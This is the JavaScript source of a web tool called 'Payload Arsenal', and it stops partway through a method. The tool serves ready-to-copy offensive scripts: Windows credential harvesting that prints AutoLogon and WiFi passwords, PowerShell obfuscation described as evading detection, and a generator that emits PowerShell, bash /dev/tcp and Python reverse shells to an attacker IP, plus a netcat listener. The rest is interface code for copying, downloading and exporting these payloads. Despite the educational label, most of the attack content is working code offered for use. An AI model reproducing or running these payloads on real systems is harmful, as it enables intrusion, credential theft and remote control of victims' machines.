// Advanced Payload Arsenal - Professional Cybersecurity Research Platform
// Developed by 0x0806
// Educational & Research Use Only

class PayloadArsenal {
    constructor() {
        this.version = '2.0.0';
        this.currentSection = 'system_info';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'unix', 'macos'],
            type: ['powershell', 'bash', 'cmd', 'python', 'c']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');
        this.currentPayload = null;

        // Initialize payload database
        this.payloads = this.initializePayloads();
        this.init();
    }

    init() {
        try {
            this.showLoadingIndicator('Initializing platform...');
            this.setupEventListeners();
            this.loadSection('system_info');
            this.updateTheme();
            this.updateStats();
            this.initializeTabSwitching();
            this.hideLoadingIndicator();
            this.showNotification('Payload Arsenal loaded successfully!', 'success');
            console.log('Payload Arsenal initialized successfully');
        } catch (error) {
            console.error('Initialization failed:', error);
            this.hideLoadingIndicator();
            this.showNotification('Platform failed to load. Please refresh.', 'error');
        }
    }

    initializePayloads() {
        return {
            // ===== SYSTEM INFORMATION =====
            windows_sysinfo: {
                command: `# Windows System Information Gathering
Write-Host "[*] Windows System Information Collection" -ForegroundColor Cyan

# Basic System Information
$computerInfo = Get-ComputerInfo
Write-Host "Computer Name: $($computerInfo.WindowsProductName)" -ForegroundColor Green
Write-Host "OS Version: $($computerInfo.WindowsVersion)" -ForegroundColor Green
Write-Host "Build Number: $($computerInfo.WindowsBuildLabEx)" -ForegroundColor Green
Write-Host "Domain: $($computerInfo.CsDomain)" -ForegroundColor Green
Write-Host "Username: $env:USERNAME" -ForegroundColor Green

# Hardware Information
Write-Host "\\n[+] Hardware Information:" -ForegroundColor Yellow
Get-WmiObject Win32_Processor | Select-Object Name, Architecture, NumberOfCores | Format-List
Get-WmiObject Win32_PhysicalMemory | Measure-Object Capacity -Sum | ForEach-Object { 
    Write-Host "Total RAM: $([math]::Round($_.Sum / 1GB, 2)) GB" -ForegroundColor Cyan 
}

# Network Configuration
Write-Host "\\n[+] Network Configuration:" -ForegroundColor Yellow
Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq "Up" } | ForEach-Object {
    Write-Host "Interface: $($_.InterfaceAlias)" -ForegroundColor Magenta
    Write-Host "IPv4: $($_.IPv4Address.IPAddress)" -ForegroundColor Magenta
    Write-Host "Gateway: $($_.IPv4DefaultGateway.NextHop)" -ForegroundColor Magenta
    Write-Host "DNS: $($_.DNSServer.ServerAddresses -join ', ')" -ForegroundColor Magenta
}

# Running Processes
Write-Host "\\n[+] Top Processes by CPU:" -ForegroundColor Yellow
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table Name, Id, CPU, WorkingSet -AutoSize

# Security Information
Write-Host "\\n[+] Security Information:" -ForegroundColor Yellow
$antivirus = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
if ($antivirus) {
    $antivirus | ForEach-Object { Write-Host "Antivirus: $($_.displayName)" -ForegroundColor Red }
}

# Windows Defender Status
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus) {
    Write-Host "Windows Defender Real-time Protection: $($defenderStatus.RealTimeProtectionEnabled)" -ForegroundColor Red
    Write-Host "Windows Defender Antivirus Enabled: $($defenderStatus.AntivirusEnabled)" -ForegroundColor Red
}`,
                description: "Comprehensive Windows system information gathering including hardware, network, security, and software details.",
                complexity: "basic",
                platform: "windows",
                type: "powershell",
                category: "System Information",
                tags: ["reconnaissance", "system-info", "network", "security"],
                mitre_id: "T1082"
            },

            linux_sysinfo: {
                command: `#!/bin/bash
# Linux System Information Gathering
echo -e "\\033[1;32m[*] Linux System Information Collection\\033[0m"

# Basic System Information
echo -e "\\n\\033[1;34m[+] System Information:\\033[0m"
echo "Hostname: $(hostname -f)"
echo "Kernel: $(uname -a)"
echo "Distribution: $(lsb_release -d 2>/dev/null | cut -f2 || cat /etc/*release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"')"
echo "Architecture: $(uname -m)"
echo "Uptime: $(uptime -p 2>/dev/null || uptime)"

# Current User Information
echo -e "\\n\\033[1;34m[+] Current User Information:\\033[0m"
echo "User: $(whoami)"
echo "UID/GID: $(id)"
echo "Groups: $(groups)"
echo "Shell: $SHELL"
echo "Home Directory: $HOME"

# Hardware Information
echo -e "\\n\\033[1;34m[+] Hardware Information:\\033[0m"
echo "CPU: $(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)"
echo "CPU Cores: $(nproc)"
echo "Memory: $(free -h | grep '^Mem:' | awk '{print $2}')"
echo "Disk Usage: $(df -h / | tail -1 | awk '{print $3"/"$2" ("$5" used)"}')"

# Network Configuration
echo -e "\\n\\033[1;34m[+] Network Configuration:\\033[0m"
ip addr show 2>/dev/null | grep -E "inet |link/" | head -20

# Running Processes
echo -e "\\n\\033[1;34m[+] Top Processes by CPU:\\033[0m"
ps aux --sort=-%cpu | head -11

# Listening Services
echo -e "\\n\\033[1;34m[+] Listening Services:\\033[0m"
netstat -tlnp 2>/dev/null | grep LISTEN | head -10

echo -e "\\n\\033[1;32m[*] System Information Collection Complete\\033[0m"`,
                description: "Comprehensive Linux system information gathering including hardware, network, processes, and configuration details.",
                complexity: "basic",
                platform: "linux",
                type: "bash",
                category: "System Information",
                tags: ["reconnaissance", "linux", "system-info", "enumeration"],
                mitre_id: "T1082"
            },

            windows_credential_dump: {
                command: `# Windows Credential Harvesting
Write-Host "[*] Windows Credential Harvesting (Authorized Testing Only)" -ForegroundColor Red

# Check for AutoLogon credentials
Write-Host "\\n[+] Checking AutoLogon Registry:" -ForegroundColor Yellow
try {
    $autologon = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -ErrorAction Stop
    if ($autologon.DefaultPassword) {
        Write-Host "AutoLogon Found!" -ForegroundColor Red
        Write-Host "Username: $($autologon.DefaultUserName)" -ForegroundColor Yellow
        Write-Host "Password: $($autologon.DefaultPassword)" -ForegroundColor Yellow
        Write-Host "Domain: $($autologon.DefaultDomainName)" -ForegroundColor Yellow
    } else {
        Write-Host "No AutoLogon credentials found" -ForegroundColor Green
    }
} catch {
    Write-Host "Cannot access AutoLogon registry" -ForegroundColor Red
}

# Saved Windows Credentials
Write-Host "\\n[+] Windows Credential Manager:" -ForegroundColor Yellow
cmdkey /list

# WiFi Passwords
Write-Host "\\n[+] WiFi Passwords:" -ForegroundColor Yellow
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
foreach ($profile in $profiles) {
    Write-Host "Checking profile: $profile" -ForegroundColor Cyan
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    if ($password) {
        Write-Host "Network: $profile" -ForegroundColor Yellow
        Write-Host "Password: $($password -split ':')[1].Trim()" -ForegroundColor Red
    } else {
        Write-Host "No password stored for $profile" -ForegroundColor Green
    }
}

Write-Host "\\n[WARNING] This information is for authorized security testing only!" -ForegroundColor Red`,
                description: "Windows credential harvesting techniques for authorized security testing and penetration testing.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Credential Access",
                tags: ["credentials", "passwords", "wifi", "browser", "registry"],
                mitre_id: "T1003"
            },

            powershell_obfuscation: {
                command: `# PowerShell Obfuscation Techniques
Write-Host "[*] PowerShell Obfuscation Examples" -ForegroundColor Cyan

# Base64 Encoding
Write-Host "\\n[+] Base64 Encoding:" -ForegroundColor Yellow
$command = "Write-Host 'Hello World'; Get-Process"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
Write-Host "Original: $command" -ForegroundColor Green
Write-Host "Encoded: $encoded" -ForegroundColor Cyan
Write-Host "Execute with: powershell -EncodedCommand $encoded" -ForegroundColor Magenta

# String Concatenation and Variables
Write-Host "\\n[+] String Concatenation:" -ForegroundColor Yellow
$w = "Write"
$h = "Host"
$cmd = $w + "-" + $h
Write-Host "Obfuscated command: \\$cmd 'Hello World'" -ForegroundColor Cyan
& $cmd "Deobfuscated output"

# Character Replacement
Write-Host "\\n[+] Character Replacement:" -ForegroundColor Yellow
$obfuscated = "Wr1te-H0st".Replace("1","i").Replace("0","o")
Write-Host "Original: Wr1te-H0st" -ForegroundColor Green
Write-Host "Deobfuscated: $obfuscated" -ForegroundColor Cyan

Write-Host "\\n[*] Obfuscation Examples Complete" -ForegroundColor Green`,
                description: "Comprehensive PowerShell obfuscation techniques for evading detection and static analysis.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Defense Evasion",
                tags: ["obfuscation", "encoding", "evasion", "powershell"],
                mitre_id: "T1027"
            },

            reverse_shell_generator: {
                command: `# Multi-Platform Reverse Shell Generator
$lhost = "10.10.10.10"  # Change this to your IP
$lport = "4444"         # Change this to your port

Write-Host "[*] Reverse Shell Generator" -ForegroundColor Cyan

# PowerShell Reverse Shell
Write-Host "\\n--- PowerShell Reverse Shell ---" -ForegroundColor Green
$psReverseShell = @"
\\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
\\$stream = \\$client.GetStream();
[byte[]]\\$bytes = 0..65535|%{0};
while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0) {
    \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);
    \\$sendback = (iex \\$data 2>&1 | Out-String );
    \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';
    \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);
    \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);
    \\$stream.Flush()
};
\\$client.Close()
"@
Write-Host $psReverseShell -ForegroundColor Cyan

# Base64 Encoded PowerShell
$encodedPS = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psReverseShell))
Write-Host "\\n--- Base64 Encoded PowerShell ---" -ForegroundColor Green
Write-Host "powershell -EncodedCommand $encodedPS" -ForegroundColor Cyan

# Bash Reverse Shell
Write-Host "\\n--- Bash Reverse Shell ---" -ForegroundColor Green
$bashShell = "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
Write-Host $bashShell -ForegroundColor Cyan

# Python Reverse Shell
Write-Host "\\n--- Python Reverse Shell ---" -ForegroundColor Green
$pythonShell = "python -c \\"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\\""
Write-Host $pythonShell -ForegroundColor Cyan

# Listener Setup Instructions
Write-Host "\\n[+] Listener Setup:" -ForegroundColor Yellow
Write-Host "Start your listener with: nc -lvnp $lport" -ForegroundColor Magenta

Write-Host "\\n[*] Reverse Shell Generation Complete" -ForegroundColor Green
Write-Host "[WARNING] Use only for authorized penetration testing!" -ForegroundColor Red`,
                description: "Comprehensive reverse shell generator for multiple platforms and languages.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Command & Control",
                tags: ["reverse-shell", "c2", "multi-platform", "generator"],
                mitre_id: "T1059"
            }
        };
    }

    setupEventListeners() {
        try {
            // Navigation
            document.querySelectorAll('.nav-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    e.preventDefault();
                    const section = e.target.dataset.section;
                    if (section) {
                        this.loadSection(section);
                        // Update active state
                        document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
                        e.target.classList.add('active');
                    }
                });
            });

            // Search
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.addEventListener('input', (e) => this.performSearch(e.target.value));
            }

            // Filter toggle
            const filterBtn = document.querySelector('.search-filter');
            if (filterBtn) {
                filterBtn.addEventListener('click', () => this.toggleFilters());
            }

            // Clear search
            const clearBtn = document.querySelector('.search-clear');
            if (clearBtn) {
                clearBtn.addEventListener('click', () => this.clearSearch());
            }

            // Theme toggle
            const themeToggle = document.getElementById('themeToggle');
            if (themeToggle) {
                themeToggle.addEventListener('click', () => this.toggleTheme());
            }

            // Settings
            const settingsBtn = document.getElementById('settingsBtn');
            if (settingsBtn) {
                settingsBtn.addEventListener('click', () => this.openSettings());
            }

            // Mobile menu toggle
            const menuToggle = document.getElementById('menuToggle');
            if (menuToggle) {
                menuToggle.addEventListener('click', () => this.toggleMobileMenu());
            }

            // Filter change handlers
            document.querySelectorAll('.filter-options input[type="checkbox"]').forEach(checkbox => {
                checkbox.addEventListener('change', () => this.applyFilters());
            });

            // Modal close handlers
            document.addEventListener('click', (e) => {
                if (e.target.classList.contains('modal')) {
                    this.closeModal();
                    this.closeSettings();
                }
            });

            console.log('Event listeners setup complete');
        } catch (error) {
            console.error('Failed to setup event listeners:', error);
        }
    }

    loadSection(sectionId) {
        try {
            this.showLoadingIndicator('Loading section...');

            // Update navigation
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            const navItem = document.querySelector(`[data-section="${sectionId}"]`);
            if (navItem) navItem.classList.add('active');

            this.currentSection = sectionId;
            this.generateSectionContent(sectionId);

            this.hideLoadingIndicator();
            this.showNotification(`Loaded ${this.formatTitle(sectionId)} section`, 'success');
        } catch (error) {
            console.error('Failed to load section:', error);
            this.hideLoadingIndicator();
            this.showNotification('Failed to load section', 'error');
        }
    }

    generateSectionContent(sectionId) {
        try {
            const contentSections = document.querySelector('.content-sections');
            if (!contentSections) {
                console.error('Content sections container not found');
                return;
            }

            contentSections.innerHTML = '';

            const section = document.createElement('div');
            section.className = 'content-section active';
            section.id = sectionId;

            const sectionHeader = this.createSectionHeader(sectionId);
            const payloadGrid = document.createElement('div');
            payloadGrid.className = 'payload-grid';

            section.appendChild(sectionHeader);
            section.appendChild(payloadGrid);
            contentSections.appendChild(section);

            this.populateSection(sectionId, payloadGrid);
        } catch (error) {
            console.error('Failed to generate section content:', error);
            this.showNotification('Failed to load section content', 'error');
        }
    }

    createSectionHeader(sectionId) {
        const header = document.createElement('div');
        header.className = 'section-header';
        header.innerHTML = `
            <h2><i class="${this.getSectionIcon(sectionId)}"></i> ${this.formatTitle(sectionId)}</h2>
            <div class="section-actions">
                <span class="section-count">Loading...</span>
                <div class="section-controls">
                    <button class="btn-secondary" onclick="app.exportSection('${sectionId}')">
                        <i class="fas fa-download"></i> Export All
                    </button>
                </div>
            </div>
        `;
        return header;
    }

    populateSection(sectionId, container) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);

        if (sectionPayloads.length === 0) {
            const noPayloads = document.createElement('div');
            noPayloads.className = 'no-payloads';
            noPayloads.innerHTML = `
                <div class="no-payloads-content">
                    <i class="fas fa-info-circle"></i>
                    <h3>Section Coming Soon</h3>
                    <p>This section is being developed. More techniques will be added soon!</p>
                    <button class="btn-primary" onclick="app.loadSection('system_info')">
                        <i class="fas fa-arrow-left"></i> Go to System Info
                    </button>
                </div>
            `;
            container.appendChild(noPayloads);
        } else {
            sectionPayloads.forEach(([key, payload]) => {
                const card = this.createPayloadCard(key, payload);
                container.appendChild(card);
            });
        }

        const countElement = document.querySelector(`#${sectionId} .section-count`);
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;
        card.dataset.type = payload.type;
        card.dataset.key = key;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    <span class="platform-badge ${payload.platform}">
                        <i class="${this.getPlatformIcon(payload.platform)}"></i>
                        ${payload.platform}
                    </span>
                    <span class="type-badge">${payload.type}</span>
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="category-tag">${payload.category}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary generate-btn" data-key="${key}">
                    <i class="fas fa-rocket"></i> Generate
                </button>
                <button class="btn-secondary copy-btn" data-key="${key}">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn-icon favorite-btn ${isFavorite ? 'active' : ''}" data-key="${key}">
                    <i class="fas fa-heart"></i>
                </button>
                <button class="btn-icon details-btn" data-key="${key}">
                    <i class="fas fa-info-circle"></i>
                </button>
            </div>
        `;

        // Add event listeners with proper context
        this.attachCardEventListeners(card, key);
        return card;
    }

    attachCardEventListeners(card, key) {
        const generateBtn = card.querySelector('.generate-btn');
        const copyBtn = card.querySelector('.copy-btn');
        const favoriteBtn = card.querySelector('.favorite-btn');
        const detailsBtn = card.querySelector('.details-btn');

        if (generateBtn) {
            generateBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.generatePayload(key);
            });
        }

        if (copyBtn) {
            copyBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.copyToClipboard(key);
            });
        }

        if (favoriteBtn) {
            favoriteBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.toggleFavorite(key);
            });
        }

        if (detailsBtn) {
            detailsBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.showPayloadDetails(key);
            });
        }
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = {
            // System Information
            system_info: ['windows_sysinfo', 'linux_sysinfo'],
            network_recon: ['windows_sysinfo', 'linux_sysinfo'],
            osint: ['windows_sysinfo', 'linux_sysinfo'],
            enumeration: ['windows_sysinfo', 'linux_sysinfo'],

            // Credential Access
            credential_dump: ['windows_credential_dump'],
            password_attacks: ['windows_credential_dump'],
            token_theft: ['windows_credential_dump'],
            kerberos: ['windows_credential_dump'],

            // Privilege Escalation
            windows_privesc: ['windows_sysinfo'],
            linux_privesc: ['linux_sysinfo'],
            unix_privesc: ['linux_sysinfo'],
            kernel_exploits: ['linux_sysinfo'],

            // Defense Evasion
            av_evasion: ['powershell_obfuscation'],
            edr_bypass: ['powershell_obfuscation'],
            obfuscation: ['powershell_obfuscation'],
            steganography: [],

            // Persistence
            windows_persistence: [],
            linux_persistence: [],
            bootkit: [],
            rootkit: [],

            // Lateral Movement
            smb_lateral: [],
            wmi_lateral: [],
            ssh_lateral: [],
            rdp_lateral: [],

            // Command & Control
            c2_channels: ['reverse_shell_generator'],
            covert_comms: ['reverse_shell_generator'],
            dns_tunneling: [],
            web_shells: [],

            // Exfiltration
            data_exfil: [],
            dns_exfil: [],
            encrypted_exfil: [],
            cloud_exfil: [],

            // Impact
            destruction: [],
            ransomware: [],
            denial_service: [],
            wiper: [],

            // Custom Tools
            payload_builder: [],
            encoder: ['powershell_obfuscation'],
            shellcode_gen: [],
            reverse_shell: ['reverse_shell_generator']
        };

        const payloadKeys = sectionMap[sectionId] || [];
        return payloadKeys.map(key => [key, this.payloads[key]]).filter(([key, payload]) => payload);
    }

    generatePayload(type) {
        const payload = this.payloads[type];
        if (!payload) {
            this.showNotification('Payload not found', 'error');
            return;
        }

        this.showLoadingIndicator('Generating payload...');

        setTimeout(() => {
            this.showOutput(type, payload);
            this.addToHistory(type, payload);
            this.hideLoadingIndicator();
            this.showNotification(`Generated "${this.formatTitle(type)}" successfully!`, 'success');
        }, 500);
    }

    showOutput(type, payload) {
        const outputPanel = document.getElementById('outputPanel');
        if (!outputPanel) {
            console.error('Output panel not found');
            return;
        }

        outputPanel.classList.add('active');
        outputPanel.style.display = 'block';
        this.currentPayload = { type, payload };

        const payloadOutput = document.getElementById('payloadOutput');
        const codeLanguage = document.getElementById('codeLanguage');
        const codeSize = document.getElementById('codeSize');

        if (payloadOutput) {
            payloadOutput.textContent = payload.command;
            payloadOutput.style.whiteSpace = 'pre-wrap';
            payloadOutput.style.fontFamily = 'monospace';
        }

        if (codeLanguage) {
            codeLanguage.textContent = payload.type || 'Unknown';
        }

        if (codeSize) {
            codeSize.textContent = `${payload.command.length} bytes`;
        }

        this.updateMetadataTab(type, payload);
        this.updateHistoryTab();

        // Scroll to output panel
        outputPanel.scrollIntoView({ behavior: 'smooth' });
    }

    updateMetadataTab(type, payload) {
        const metadataContent = document.getElementById('metadataContent');
        if (!metadataContent) return;

        metadataContent.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Technique:</strong> ${this.formatTitle(type)}
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> <i class="${this.getPlatformIcon(payload.platform)}"></i> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Type:</strong> ${payload.type}
                </div>
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Tags:</strong> ${payload.tags ? payload.tags.join(', ') : 'None'}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
            </div>
        `;
    }

    updateHistoryTab() {
        const historyContent = document.getElementById('historyContent');
        if (!historyContent) return;

        if (this.payloadHistory.length === 0) {
            historyContent.innerHTML = '<p>No payload history available.</p>';
            return;
        }

        const historyHtml = this.payloadHistory.slice(0, 10).map(item => `
            <div class="history-item">
                <div class="history-header">
                    <strong>${this.formatTitle(item.type)}</strong>
                    <span class="history-time">${new Date(item.timestamp).toLocaleString()}</span>
                </div>
                <div class="history-description">${item.description}</div>
                <div class="history-actions">
                    <button class="btn-sm" onclick="app.regenerateFromHistory('${item.type}')">
                        <i class="fas fa-redo"></i> Regenerate
                    </button>
                </div>
            </div>
        `).join('');

        historyContent.innerHTML = historyHtml;
    }

    copyToClipboard(type) {
        const payload = type ? this.payloads[type] : this.currentPayload?.payload;
        if (!payload) {
            this.showNotification('No payload to copy', 'error');
            return;
        }

        const textToCopy = payload.command || payload;
        navigator.clipboard.writeText(textToCopy).then(() => {
            this.showNotification('Copied to clipboard!', 'success');
        }).catch(() => {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = textToCopy;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            this.showNotification('Copied to clipboard!', 'success');
        });
    }

    downloadPayload() {
        if (!this.currentPayload) {
            this.showNotification('No payload to download', 'error');
            return;
        }

        const { type, payload } = this.currentPayload;
        const filename = `${type}_${new Date().toISOString().slice(0, 10)}.${this.getFileExtension(payload.type)}`;

        const blob = new Blob([payload.command], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showNotification('Payload downloaded!', 'success');
    }

    getFileExtension(type) {
        const extensions = {
            'powershell': 'ps1',
            'bash': 'sh',
            'cmd': 'bat',
            'python': 'py',
            'c': 'c'
        };
        return extensions[type] || 'txt';
    }

    sharePayload() {
        if (!this.currentPayload) {
            this.showNotification('No payload to share', 'error');
            return;
        }

        if (navigator.share) {
            navigator.share({
                title: `Payload: ${this.formatTitle(this.currentPayload.type)}`,
                text: this.currentPayload.payload.command
            });
        } else {
            this.copyToClipboard();
            this.showNotification('Payload copied for sharing!', 'info');
        }
    }

    toggleFavorite(type) {
        const index = this.favorites.indexOf(type);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showNotification('Removed from favorites', 'info');
        } else {
            this.favorites.push(type);
            this.showNotification('Added to favorites', 'success');
        }
        localStorage.setItem('favorites', JSON.stringify(this.favorites));

        // Update UI
        const favoriteBtn = document.querySelector(`[data-key="${type}"] .favorite-btn`);
        if (favoriteBtn) {
            favoriteBtn.classList.toggle('active');
        }
    }

    showPayloadDetails(type) {
        const payload = this.payloads[type];
        if (!payload) return;

        const modal = document.getElementById('detailsModal');
        const title = document.getElementById('modalTitle');
        const body = document.getElementById('modalBody');

        if (title) title.textContent = this.formatTitle(type);
        if (body) {
            body.innerHTML = `
                <div class="payload-details">
                    <div class="detail-section">
                        <h4>Description</h4>
                        <p>${payload.description}</p>
                    </div>
                    <div class="detail-section">
                        <h4>Technical Details</h4>
                        <ul>
                            <li><strong>Platform:</strong> ${payload.platform}</li>
                            <li><strong>Type:</strong> ${payload.type}</li>
                            <li><strong>Complexity:</strong> ${payload.complexity}</li>
                            <li><strong>Category:</strong> ${payload.category}</li>
                            <li><strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}</li>
                        </ul>
                    </div>
                    <div class="detail-section">
                        <h4>Tags</h4>
                        <div class="tag-list">
                            ${payload.tags ? payload.tags.map(tag => `<span class="tag">${tag}</span>`).join('') : 'None'}
                        </div>
                    </div>
                    <div class="detail-actions">
                        <button class="btn-primary" onclick="app.generatePayload('${type}'); app.closeModal();">
                            <i class="fas fa-rocket"></i> Generate Payload
                        </button>
                        <button class="btn-secondary" onclick="app.copyToClipboard('${type}')">
                            <i class="fas fa-copy"></i> Copy Code
                        </button>
                    </div>
                </div>
            `;
        }

        if (modal) modal.classList.add('active');
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
    }

    clearSearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.value = '';
            this.searchTerm = '';
            this.filterPayloads();
        }
    }

    applyFilters() {
        // Update active filters based on checkboxes
        this.activeFilters.platform = Array.from(document.querySelectorAll('.platform-filters input:checked')).map(cb => cb.value);
        this.activeFilters.complexity = Array.from(document.querySelectorAll('.complexity-filters input:checked')).map(cb => cb.value);
        this.activeFilters.type = Array.from(document.querySelectorAll('.type-filters input:checked')).map(cb => cb.value);

        this.filterPayloads();
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;

        cards.forEach(card => {
            const title = card.querySelector('h3')?.textContent.toLowerCase() || '';
            const description = card.querySelector('.card-description')?.textContent.toLowerCase() || '';
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());

            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));

            const matchesPlatform = this.activeFilters.platform.includes(card.dataset.platform);
            const matchesComplexity = this.activeFilters.complexity.includes(card.dataset.complexity);
            const matchesType = this.activeFilters.type.includes(card.dataset.type);

            if (matchesSearch && matchesPlatform && matchesComplexity && matchesType) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    toggleFilters() {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        localStorage.setItem('theme', this.currentTheme);

        const icon = document.querySelector('#themeToggle i');
        if (icon) {
            icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            description: payload.description,
            timestamp: new Date().toISOString()
        };

        this.payloadHistory.unshift(historyItem);
        if (this.payloadHistory.length > 50) {
            this.payloadHistory = this.payloadHistory.slice(0, 50);
        }

        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    regenerateFromHistory(type) {
        this.generatePayload(type);
    }

    exportSection(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        if (sectionPayloads.length === 0) {
            this.showNotification('No payloads to export in this section', 'warning');
            return;
        }

        let exportData = `# ${this.formatTitle(sectionId)} - Exported from Payload Arsenal\n`;
        exportData += `# Generated on ${new Date().toLocaleString()}\n\n`;

        sectionPayloads.forEach(([key, payload]) => {
            exportData += `## ${this.formatTitle(key)}\n`;
            exportData += `Platform: ${payload.platform}\n`;
            exportData += `Type: ${payload.type}\n`;
            exportData += `Complexity: ${payload.complexity}\n`;
            exportData += `Description: ${payload.description}\n\n`;
            exportData += `\`\`\`${payload.type}\n${payload.command}\n\`\`\`\n\n`;
        });

        const blob = new Blob([exportData], { type: 'text/markdown' });
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = `${sectionId}_payloads_${new Date().toISOString().slice(0, 10)}.md`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showNotification(`Exported ${sectionPayloads.length} payloads!`, 'success');
    }

    updateStats() {
        const totalPayloads = document.getElementById('totalPayloads');
        if (totalPayloads) {
            totalPayloads.textContent = `${Object.keys(this.payloads).length}+`;
        }
    }

    openSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.add('active');
        }
    }

    closeSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    closeOutput() {
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) outputPanel.classList.remove('active');
    }

    closeModal() {
        const modal = document.getElementById('detailsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    toggleMobileMenu() {
